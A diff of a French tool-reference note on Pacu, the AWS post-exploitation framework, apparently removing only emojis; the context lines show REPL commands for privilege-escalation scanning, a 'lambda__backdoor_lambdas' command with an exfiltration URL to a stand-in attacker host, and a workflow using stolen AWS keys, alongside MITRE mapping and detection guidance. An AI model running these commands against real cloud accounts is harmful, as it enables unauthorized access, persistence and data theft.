@@ -1,7 +1,7 @@
 ---
 title: "Outil - Pacu"
 type: outil
-categorie: ☁️ Cloud & Containers
+categorie: Cloud & Containers
 tags:
   - cyber
   - outil
@@ -17,20 +17,20 @@ site: https://rhinosecuritylabs.com/aws/pacu-open-source-aws-exploitation-framew
 doc: https://github.com/RhinoSecurityLabs/pacu/wiki
 ---
 
-# 🐱 Pacu — Le framework d'attaque AWS
+# Pacu — Le framework d'attaque AWS
 
 > [!info] **En 1 phrase**
 > Framework post-exploitation open source qui te permet de lancer des modules d'exploitation AWS à la manière de Metasploit.
 
 ---
 
-## 🧾 Overview
+## Overview
 
 | Champ | Valeur |
 |---|---|
 | Nom complet | Pacu (The AWS exploitation framework) |
 | Description | Framework Python modulaire de post-exploitation AWS : énumération, escalade de privilèges, persistance, pillage de données et exfiltration via l'API AWS |
-| Catégorie | ☁️ Cloud & Containers |
+| Catégorie | Cloud & Containers |
 | Sous-catégorie | Post-exploitation cloud / Offensif AWS |
 | Type d'outil | CLI interactive (framework modulaire, style Metasploit) |
 | Licence | BSD-3-Clause |
@@ -50,7 +50,7 @@ doc: https://github.com/RhinoSecurityLabs/pacu/wiki
 
 ---
 
-## 🎯 Concept
+## Concept
 
 Pacu est un framework d'attaque AWS conçu par Rhino Security Labs pour automatiser la phase de **post-exploitation cloud** : il est l'équivalent de Metasploit pour Amazon Web Services, là où les scanners de conformité (ScoutSuite, Prowler) sont l'équivalent de Nessus. Il s'exécute en local, s'authentifie auprès de l'API AWS avec des credentials compromis (Access Key AKIA…, clés de session STS, rôles assumés via `sts:AssumeRole`, profils de machines EC2) et pilote l'API à travers **boto3**. Tout l'état d'un engagement est conservé dans une **base SQLite locale** : sessions séparées par client, données d'énumération réutilisables, minimisation des appels API (donc des logs CloudTrail).
 
@@ -70,7 +70,7 @@ flowchart LR
 
 ---
 
-## 🧠 Concepts fondamentaux
+## Concepts fondamentaux
 
 | Concept | Explication |
 |---|---|
@@ -83,7 +83,7 @@ flowchart LR
 
 ---
 
-## 🛠️ Installation
+## Installation
 
 ### Debian / Ubuntu / Kali Linux
 
@@ -126,14 +126,14 @@ docker run -it --entrypoint /bin/sh rhinosecuritylabs/pacu:latest
 docker run -it -v ~/.aws:/root/.aws rhinosecuritylabs/pacu:latest
 ```
 
-> [!warning] ⚠️ Prérequis & problèmes potentiels
+> [!warning] Prérequis & problèmes potentiels
 > - Pacu requiert Python 3.7+ et pip3 ; sur Kali, `pip` n'est plus installé par défaut → utiliser `pipx install git+https://github.com/RhinoSecurityLabs/pacu.git`.
 > - La base SQLite est créée au premier lancement dans `~/.local/share/pacu/sqlite.db`. Si tu passes de v1.4.x à v1.5.0+, supprime l'ancienne base (`rm ~/.local/share/pacu/sqlite.db`) sinon erreur de migration.
 > - Les modules destructifs exigent des clés valides : sans `aws_access_key_id`/`aws_secret_access_key` valides, tout module échoue avec des erreurs `ClientError`.
 
 ---
 
-## ⚙️ Configuration
+## Configuration
 
 Pacu est configuré **en interactif** (commandes du REPL) et persiste l'état dans une base SQLite locale. Il n'y a pas de fichier de config global ; chaque engagement est une session.
 
@@ -148,7 +148,7 @@ Pacu est configuré **en interactif** (commandes du REPL) et persiste l'état da
 
 ---
 
-## 🏗️ Architecture interne
+## Architecture interne
 
 Pacu est un package Python organisé ainsi (dépôt `RhinoSecurityLabs/pacu`) :
 
@@ -172,7 +172,7 @@ flowchart LR
 
 ---
 
-## ⌨️ Commandes
+## Commandes
 
 ### Commandes principales
 
@@ -189,7 +189,7 @@ Une fois dans l'interface Pacu, voici les commandes interactives clés :
 | `list` | Liste les modules disponibles par catégorie | Inventaire des modules |
 | `run enumerate_iam` | Teste les permissions API une à une | Liste des actions autorisées |
 | `run iam_privesc_scan` | Cherche les chemins d'escalade de privilèges connus | Chemins exploitables (avec preuves) |
-| `run all` | Exécute tous les modules sans confirmation | Exécution complète (⚠️ destructif potentiel) |
+| `run all` | Exécute tous les modules sans confirmation | Exécution complète (destructif potentiel) |
 | `services` | Active/désactive les services à auditer | Liste à cocher |
 | `exec aws s3 ls` | Exécute une commande AWS CLI avec les clés de session | Sortie AWS CLI standard |
 | `set regions us-east-1` | Cible une région | Modules limités à la région |
@@ -209,7 +209,7 @@ data s3
 
 ---
 
-## 🎚️ Options et flags
+## Options et flags
 
 | Option / Commande | Description | Exemple | Niveau |
 |---|---|---|---|
@@ -224,7 +224,7 @@ data s3
 
 ---
 
-## 🧪 Exemples pratiques
+## Exemples pratiques
 
 ### Beginner
 
@@ -291,7 +291,7 @@ run lambda__backdoor_lambdas --name example-lambda --exfil-url https://attacker.
 
 ---
 
-## 🧪 Workflow complet (scénario pas à pas)
+## Workflow complet (scénario pas à pas)
 
 1. **Obtenir des credentials** — clés AWS volées dans un repo Git public, une instance EC2 compromise (metadata) ou une Lambda leakée. Validation hors Pacu :
    ```bash
@@ -321,7 +321,7 @@ run lambda__backdoor_lambdas --name example-lambda --exfil-url https://attacker.
 
 ---
 
-## 🎬 Scénarios avancés
+## Scénarios avancés
 
 ### Scénario 1 : Escalade de privilèges via une policy mal configurée
 
@@ -347,7 +347,7 @@ Ce scénario simule un attaquant qui garde l'accès via un déclencheur Lambda r
 
 ---
 
-## 🛡️ Cybersecurity use cases
+## Cybersecurity use cases
 
 | Phase | Utilisation |
 |---|---|
@@ -360,7 +360,7 @@ Ce scénario simule un attaquant qui garde l'accès via un déclencheur Lambda r
 
 ---
 
-## 🎯 MITRE ATT&CK
+## MITRE ATT&CK
 
 | Tactique | Technique / Sub-technique | ID | Raison | Détection | Mitigation |
 |---|---|---|---|---|---|
@@ -378,7 +378,7 @@ Ce scénario simule un attaquant qui garde l'accès via un déclencheur Lambda r
 
 ---
 
-## 🛡️ Defensive Security
+## Defensive Security
 
 ### Signes observables
 
@@ -415,7 +415,7 @@ level: high
 
 ---
 
-## 🤖 Automatisation
+## Automatisation
 
 ```bash
 # Bash — lancer un module Pacu en non-interactif puis parser le rapport
@@ -445,7 +445,7 @@ for module in ["enumerate_iam", "iam_privesc_scan", "user_enum"]:
 
 ---
 
-## 📤 Output et parsing
+## Output et parsing
 
 Chaque module Pacu écrit deux types de sortie dans `sessions/<session>/<module>/` :
 
@@ -463,9 +463,9 @@ grep -c "escaped" sessions/redteam-alpha/iam_privesc_scan/report.md
 
 ---
 
-## 🔗 Intégrations
+## Intégrations
 
-- [[Tools|🧰 Outils]] global
+- [[Tools| Outils]] global
 - [[Outil - ScoutSuite|ScoutSuite]] — audit de configuration passif avant l'attaque
 - [[Outil - Prowler|Prowler]] — conformité CIS/NIST avant exploitation
 - [[Outil - cloudfox|cloudfox]] — cartographie des chemins de confiance IAM complémentaire
@@ -479,7 +479,7 @@ CloudGoat → Pacu → cloudfox (chemins) → AWS CLI (validation) → Rapport m
 
 ---
 
-## 🔄 Alternatives
+## Alternatives
 
 | Outil | Avantages | Inconvénients | Cas d'usage |
 |---|---|---|---|
@@ -488,7 +488,7 @@ CloudGoat → Pacu → cloudfox (chemins) → AWS CLI (validation) → Rapport m
 | cloudfox | Cartographie des chemins de confiance, REPL rapide | Contexte uniquement, pas de modules d'attaque | Mouvements latéraux |
 ---
 
-## ⚡ Performance
+## Performance
 
 - Chaque appel API est une requête HTTP vers l'endpoint régional d'AWS : la latence domine (100-300 ms par appel selon la région).
 - `enumerate_iam` teste plusieurs dizaines d'actions par service : sur un compte avec toutes les régions actives, un run complet peut prendre plusieurs minutes.
@@ -498,7 +498,7 @@ CloudGoat → Pacu → cloudfox (chemins) → AWS CLI (validation) → Rapport m
 
 ---
 
-## 🛠️ Troubleshooting
+## Troubleshooting
 
 ### Common problems
 
@@ -516,7 +516,7 @@ CloudGoat → Pacu → cloudfox (chemins) → AWS CLI (validation) → Rapport m
 
 ---
 
-## 🔐 Sécurité de l'outil
+## Sécurité de l'outil
 
 - **Cadre légal** : Pacu exécute des actions destructives sur un compte AWS. N'utiliser que sur des comptes autorisés (pentest signé, lab CloudGoat, compte de test).
 - **AUP AWS** : certaines actions doivent être préalablement autorisées par AWS (Customer Support Policy for Penetration Testing) ; à vérifier avant engagement.
@@ -527,7 +527,7 @@ CloudGoat → Pacu → cloudfox (chemins) → AWS CLI (validation) → Rapport m
 
 ---
 
-## ⚠️ Limitations
+## Limitations
 
 - **AWS uniquement** : pas de support Azure/GCP (contrairement à Prowler ou ScoutSuite).
 - **Escalades IAM connues uniquement** : `iam_privesc_scan` couvre la matrice d'escalade documentée par Rhino Security Labs ; les chemins custom ne sont pas détectés.
@@ -538,7 +538,7 @@ CloudGoat → Pacu → cloudfox (chemins) → AWS CLI (validation) → Rapport m
 
 ---
 
-## 📋 Cheatsheet
+## Cheatsheet
 
 ```bash
 # Installer
@@ -576,7 +576,7 @@ exit                               # sauvegarder la session
 
 ---
 
-## ⚡ Quick reference
+## Quick reference
 
 | | |
 |---|---|
@@ -589,7 +589,7 @@ exit                               # sauvegarder la session
 
 ---
 
-## 🔍 Détection & Défense
+## Détection & Défense
 
 | Signe | Défense |
 |---|---|
@@ -602,16 +602,16 @@ exit                               # sauvegarder la session
 
 ---
 
-## ⚠️ Tips & Pièges
+## Tips & Pièges
 
-> [!tip] 💡 **Tips**
+> [!tip] **Tips**
 > - `run iam_privesc_scan` ne détecte QUE les escalades réelles de la matrice de Rhino Security Labs : combine-le avec `enumerate_iam` pour couvrir les permissions custom.
 > - Exporte un rapport markdown après chaque module (`report` ou les fichiers générés dans la session) pour preuve de pentest.
 > - Utilise `set regions` pour cibler uniquement les régions pertinentes et gagner du temps.
 > - Crée une session Pacu par engagement (`set session <nom>`) pour garder des données propres et comparables.
 > - Vérifie l'identité avec `whoami` systématiquement : des clés sans permissions perdent du temps.
 
-> [!warning] ⚠️ **Pièges**
+> [!warning] **Pièges**
 > - Ne pas exécuter `run all` sur un environnement de production sans accord écrit : certains modules sont destructifs.
 > - Pacu est détectable : `enumerate_iam` génère beaucoup de `AccessDenied` dans CloudTrail. Utilise-le sur des comptes isolés ou autorisés.
 > - Les clés de courte durée (STS) expirent : si la session tombe en erreur, ré-importe des clés fraîches.
@@ -620,7 +620,7 @@ exit                               # sauvegarder la session
 
 ---
 
-## 📚 References
+## References
 
 ### Official
 
@@ -647,4 +647,4 @@ exit                               # sauvegarder la session
 
 ---
 
-➡️ **Liens :** [[Tools|🧰 Outils]] · [[Outil - ScoutSuite|ScoutSuite]] · [[Outil - cloudfox|cloudfox]] · [[Outil - Prowler|Prowler]]
+**Liens :** [[Tools| Outils]] · [[Outil - ScoutSuite|ScoutSuite]] · [[Outil - cloudfox|cloudfox]] · [[Outil - Prowler|Prowler]]
